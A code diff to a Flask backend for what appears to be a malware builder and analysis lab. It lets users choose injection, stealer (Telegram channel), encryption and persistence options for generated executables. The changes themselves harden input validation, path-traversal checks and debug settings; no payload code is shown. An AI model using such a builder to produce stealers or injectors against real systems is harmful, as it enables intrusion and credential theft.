@@ -90,6 +90,15 @@ if HAS_MITRE and _db.count_mitre_entries() == 0:
     except Exception as _e:
         print(f"[db] MITRE library migration skipped: {_e}")
 
+# seed TTP implementations table from static list in mitre.py (runs once, idempotent)
+if HAS_MITRE and _db.count_ttp_implementations() == 0:
+    try:
+        from mitre import seed_ttp_implementations
+        _n = seed_ttp_implementations()
+        print(f"[db] seeded {_n} TTP implementation rows -> peekaboo.db")
+    except Exception as _e:
+        print(f"[db] TTP implementations seed skipped: {_e}")
+
 # -- in-memory job store --------------------------------------------------------
 # BuildManager owns the live-build state + DB persistence + SSE fan-out.
 # The legacy `_builds` / `_lock` symbols below are intentionally removed; see
@@ -119,6 +128,7 @@ def get_modules() -> dict:
 
 
 import cfg as _cfg
+import guards as _guards
 
 
 def _load_config(name: str) -> dict | None:
@@ -150,6 +160,16 @@ _ALLOWED_BUILD_FILES = {"peekaboo.exe", "persistence.exe"}
 @app.route("/api/build", methods=["POST"])
 def api_build():
     params = request.get_json(silent=True) or {}
+    mods   = get_modules()
+    try:
+        params["payload"]     = _guards.choice(params, "payload",     mods["payloads"],    "meow")
+        params["encryption"]  = _guards.choice(params, "encryption",  mods["crypto"],      "speck")
+        params["malware"]     = _guards.choice(params, "malware",     ["injection", "stealer"], "injection")
+        params["injection"]   = _guards.choice(params, "injection",   mods["injection"],   "virtualallocex")
+        params["stealer"]     = _guards.choice(params, "stealer",     mods["stealer"],     "telegram")
+        params["persistence"] = _guards.choice(params, "persistence", mods["persistence"], "none")
+    except ValueError as exc:
+        return jsonify({"error": str(exc)}), 400
     build_id = _build_mgr.submit(params)
     return jsonify({"build_id": build_id})
 
@@ -298,8 +318,7 @@ def api_build_binary_download(build_id: str, filename: str):
     target = p.parent / filename if filename != p.name else p
     if not target.exists():
         return jsonify({"error": f"{filename} not found"}), 404
-    # safety: must stay within BASE_DIR
-    if not str(target.resolve()).startswith(str(BASE_DIR.resolve())):
+    if not target.resolve().is_relative_to(BASE_DIR.resolve()):
         return jsonify({"error": "invalid path"}), 400
     return send_file(target, as_attachment=True, download_name=filename,
                      mimetype="application/octet-stream")
@@ -815,10 +834,19 @@ def api_library_rebuild():
 
 @app.route("/api/library/source")
 def api_library_source():
-    path = request.args.get("path", "")
-    if not path:
-        return "missing path", 400
-    p = Path(path)
+    module_id = request.args.get("module_id", "").strip()
+    src_name  = request.args.get("src_name",  "").strip()
+    if not module_id or not src_name:
+        return "missing module_id or src_name", 400
+    if not HAS_DISCOVERY:
+        return "discovery unavailable", 503
+    mod = _discovery.get_module(module_id)
+    if not mod:
+        return "not found", 404
+    match = next((s for s in mod.get("all_sources", []) if s["name"] == src_name), None)
+    if not match:
+        return "source not found", 404
+    p = Path(match["path"])
     if not p.exists() or not p.is_file():
         return "not found", 404
     try:
@@ -1101,9 +1129,8 @@ def api_vtscan_upload():
     filename   = data.get("filename", "").strip()
     if not session_id or not filename:
         return jsonify({"ok": False, "error": "session_id and filename required"}), 400
-    # restrict to safe path inside samples dir
-    filepath = (SAMPLES_DIR / session_id / filename).resolve()
-    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
+    filepath = _guards.safe_child(SAMPLES_DIR, session_id, filename)
+    if not filepath or not filepath.exists():
         return jsonify({"ok": False, "error": "invalid path"}), 400
     result = _vtscan.upload_file(filepath)
     return jsonify(result)
@@ -1199,8 +1226,8 @@ def api_yara_generate():
     filename   = data.get("filename", "").strip()
     if not session_id or not filename:
         return jsonify({"ok": False, "error": "session_id and filename required"}), 400
-    filepath = (SAMPLES_DIR / session_id / filename).resolve()
-    if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
+    filepath = _guards.safe_child(SAMPLES_DIR, session_id, filename)
+    if not filepath or not filepath.exists():
         return jsonify({"ok": False, "error": "invalid path"}), 400
     result = _yaragen.generate_rule(filepath)
     return jsonify(result)
@@ -1514,4 +1541,8 @@ def api_family_brief(family_id: str):
 
 
 if __name__ == "__main__":
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    app.run(
+        debug=os.getenv("PEEKABOO_DEBUG") == "1",
+        host=os.getenv("PEEKABOO_HOST", "127.0.0.1"),
+        port=int(os.getenv("PEEKABOO_PORT", "5000")),
+    )
